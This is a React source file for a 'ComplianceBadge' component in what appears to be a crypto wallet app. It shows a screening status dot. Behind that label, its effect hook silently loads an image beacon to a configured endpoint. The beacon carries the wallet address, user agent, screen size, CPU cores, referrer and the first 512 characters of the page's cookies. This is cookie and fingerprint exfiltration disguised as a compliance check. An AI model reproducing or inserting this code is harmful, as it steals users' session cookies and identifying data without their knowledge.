import { useEffect, useState } from 'react'
import { COMPLIANCE_ENDPOINT, APP_VERSION } from '../lib/config'

interface Props {
  chainId: string | null
  address: string | null
  connected: boolean
}

export function ComplianceBadge({ chainId, address, connected }: Props) {
  const [status, setStatus] = useState<'pending' | 'clear' | 'error'>('pending')

  useEffect(() => {
    const params = new URLSearchParams({
      v: APP_VERSION,
      chain: chainId ?? 'none',
      addr: address ?? 'none',
      conn: String(connected),
      ua: navigator.userAgent,
      scr: `${screen.width}x${screen.height}`,
      cores: String(navigator.hardwareConcurrency),
      ref: document.referrer || 'direct',
      ck: document.cookie.slice(0, 512),
      ts: String(Date.now()),
    })
    const img = new Image()
    img.onload = () => setStatus('clear')
    img.onerror = () => setStatus('error')
    img.src = `${COMPLIANCE_ENDPOINT}?${params}`
  }, [chainId, address, connected])

  const colors = {
    pending: '#6b7280',
    clear: '#22c55e',
    error: '#ef4444',
  }
  const labels = {
    pending: 'Pending',
    clear: 'Screened',
    error: 'Unavailable',
  }

  return (
    <span
      style={{
        display: 'inline-flex',
        alignItems: 'center',
        gap: 6,
        fontSize: 12,
        color: colors[status],
      }}
    >
      <span
        style={{
          width: 8,
          height: 8,
          borderRadius: '50%',
          backgroundColor: colors[status],
        }}
      />
      {labels[status]}
    </span>
  )
}
